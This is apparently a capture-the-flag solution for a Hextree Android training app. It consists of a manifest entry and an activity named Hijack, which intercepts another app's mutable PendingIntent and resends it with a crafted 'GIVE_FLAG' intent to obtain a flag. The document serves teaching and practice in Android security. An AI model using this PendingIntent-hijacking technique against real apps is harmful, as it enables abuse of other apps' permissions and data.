    // in manifest.xml
    <activity
        android:name=".Hijack"
        android:exported="true">
        <intent-filter>
            <action android:name="io.hextree.attacksurface.MUTATE_ME" />
            <category android:name="android.intent.category.DEFAULT" />
        </intent-filter>
    </activity>


    public class Hijack extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_hijack);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        PendingIntent pendingIntent = getIntent().getParcelableExtra("pending_intent");

        if(pendingIntent != null){

            Intent intent = new Intent("io.hextree.attacksurface.GIVE_FLAG");
            intent.putExtra("code",42);

            try {
                pendingIntent.send(this, 0, intent);

            } catch (PendingIntent.CanceledException e) {
                throw new RuntimeException(e);
            }

        }else {
            Log.d("Flag23", "Not Found");
        }
    }
}